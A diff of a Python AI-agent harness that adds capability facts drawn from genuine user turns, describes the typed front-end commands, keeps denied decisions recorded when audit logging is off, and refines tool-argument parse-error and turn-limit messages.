+            facts.extend(_tool_fact(n) for n in members[:_TOOL_FAMILY_FACTS])
+    return facts[:MAX_MENTION_FACTS]
+
+
+def _mentioned_capabilities_prompt(messages, system_prompt):
+    """Wrap `system_prompt` with registry facts for what this turn's message names.
+
+    The same shape and boundary as _recalled_memory_prompt: built from the last
+    GENUINE user turn only, so tool output cannot inject "facts". Nothing is
+    added when nothing is named -- telling a small model everything up front
+    costs every turn and makes it worse at the task.
+    """
+    turns = _genuine_user_turns(messages)
+    facts = _mentioned_capability_facts(_message_text(turns[-1])) if turns else []
+    if not facts:
+        return system_prompt
+    addition = _MENTION_HEADER + "\n".join(facts)
+
+    def with_facts():
+        base = system_prompt() if callable(system_prompt) else system_prompt
+        return (base or current_system_prompt()) + "\n\n" + addition
+
+    return with_facts
+
+
 def _capture_turn_memory(messages, answer, *, identity=None, run_id=None,
                          source_channel="", in_background=False) -> None:
     global memory_capture_thread
@@ -11480,6 +11969,9 @@ def _audit(event: str, **fields) -> None:
     _redact_secrets, so a blocked exfiltration attempt is recorded without
     writing the credential to disk.
     """
+    # Before the AUDIT_ENABLED check: turning the log off must not turn this off.
+    if fields.get("decision") == "denied":
+        _note_config_blocker(str(fields.get("reason") or ""), str(fields.get("detail") or ""))
     if not AUDIT_ENABLED:
         return
     try:
@@ -12712,6 +13204,29 @@ def _on_off(value, unit: str = "") -> str:
     return f"{value}{unit}"
 
 
+_COMMAND_IS_TYPED = ("This is a command the user types at the Agent8088 prompt. It is not "
+                     "a tool you can call; tell the user to type it.")
+
+
+def _close_commands(name: str, cutoff: float = 0.6) -> list:
+    import difflib
+    return difflib.get_close_matches(name.lower(), FRONTEND_COMMANDS, n=3, cutoff=cutoff)
+
+
+def _describe_command(name: str) -> str:
+    """describe_tool for a front-end command -- or for one that does not exist."""
+    key = name.strip().lower()
+    if key in FRONTEND_COMMANDS:
+        usage, description, details = FRONTEND_COMMANDS[key]
+        return json.dumps({"command": f"/{key}", "usage": usage, "description": description,
+                           "details": details, "how_to_use": _COMMAND_IS_TYPED},
+                          ensure_ascii=False, indent=2)
+    close = _close_commands(key)
+    hint = f" Did you mean {', '.join('/' + c for c in close)}?" if close else ""
+    return (f"No /{key} command exists in this Agent8088 front end.{hint} "
+            "Do not describe one that does not exist.")
+
+
 def describe_tool(tool_name, specs=None) -> str:
     """Return one live tool schema without executing the described tool.
 
@@ -12724,6 +13239,8 @@ def describe_tool(tool_name, specs=None) -> str:
     if not isinstance(tool_name, str) or not tool_name.strip() or len(tool_name) > 200:
         return "Error: Provide one exact tool name, e.g. read_text. Use /tools to list available names."
     name = tool_name.strip()
+    if name.startswith("/") or (name not in registry and name.lower() in FRONTEND_COMMANDS):
+        return _describe_command(name.lstrip("/"))
     spec = registry.get(name)
     if spec is None:
         return f"Error: Unknown or unavailable tool {name!r}. Use /tools to list available names. No tool was executed."
@@ -12798,6 +13315,12 @@ def describe_capabilities() -> str:
             for mcp_tool in tools:
                 lines.append(f"    - {mcp_tool}")
     lines.append("")
+
+    if FRONTEND_COMMANDS:
+        lines.append(f"## Commands the user can type ({len(FRONTEND_COMMANDS)})")
+        lines.extend(f"- /{name}: {description}"
+                     for name, (_, description, _) in sorted(FRONTEND_COMMANDS.items()))
+        lines.append("")
 
     # --- Skills and subagents ---
     lines.append(f"## Skills ({len(SKILL_PACKAGES)})")
@@ -13152,6 +13675,8 @@ def run_agent(messages, *, budget=None, memory_identity=None, memory_run_id=None
             kwargs["spin"]("thinking...")
         kwargs["system_prompt"] = _recalled_memory_prompt(
             messages, kwargs.get("system_prompt"), identity=memory_identity)
+        kwargs["system_prompt"] = _mentioned_capabilities_prompt(
+            messages, kwargs.get("system_prompt"))
     answer = None
     try:
         with _running_on(messages):
@@ -13695,9 +14220,6 @@ def _user_requested_tool(messages, name: str) -> bool:
     return False
 
 
-# Web fetching wearing a shell command as a disguise.
-_WEB_FETCH_SHELL = _SHELL_WEB_CLIENT
-
 # MCP tools whose name says they fetch. Name-based because MCP specs carry no
 # capability metadata to key off — see the docstring in _is_fetch_followup.
 _MCP_FETCH_NAME = re.compile(r"(?:search|fetch|browse|web|http|scrape)", re.IGNORECASE)
@@ -13727,7 +14249,7 @@ def _is_fetch_followup(messages, name: str, args: dict) -> bool:
                     or _user_requested_tool(messages, name))
     if name == "execute_shell":
         command = str(args.get("command") or "")
-        return bool(_WEB_FETCH_SHELL.search(command)) and not _user_requested_tool(
+        return _shell_fetches_web(command) and not _user_requested_tool(
             messages, "execute_shell")
     if (TOOL_SPECS.get(name) or {}).get("mode") == "mcp":
         return bool(_MCP_FETCH_NAME.search(name)) and not _user_requested_tool(
@@ -14943,11 +15465,16 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
                     on_result(name, result)
                 malformed_round = True
                 parse_error_retries += 1
+                where = args.get("__parse_error_at__")
                 messages.append(_harness_turn((
-                    f"The arguments for '{name}' could not be parsed as JSON. Do "
-                    "not re-send the same payload unchanged. Send a smaller, "
-                    "simpler one instead: drop every optional argument, keep the "
-                    "JSON on a single line, and include only the required arguments."
+                    f"The arguments for '{name}' could not be parsed as JSON"
+                    + (f" ({where})" if where else "") + ". Do not re-send the "
+                    "same payload unchanged. The usual cause is a double quote "
+                    "inside a string value that is not escaped as \\\" (code "
+                    "with \"\"\"docstrings\"\"\" or f\"...\" strings). Escape every "
+                    "quote and newline inside values. For long file content, "
+                    "write a shorter first part and add the rest with further "
+                    "calls; otherwise send only the required arguments."
                 )))
                 if trace is not None:
                     trace.append({"turn": turn, "type": "tool_arg_parse_error",
@@ -15098,7 +15625,7 @@ def _run_agent_loop(messages, *, max_turns=10, temperature=0.1, spin=None,
     # Max turns reached or forced stop: report the failure, not the beginning of
     # accumulated tool context (which is usually a skill document).
     reason = ("stopped because repeated tool calls made no progress"
-              if forced_stop else f"reached the {policy.limit}-turn limit before completing the task")
+              if forced_stop else _turn_limit_reason(policy.limit))
     wrapped = _answer_from_context(
         messages, system_prompt=(system_prompt() if callable(system_prompt)
                                  else system_prompt),
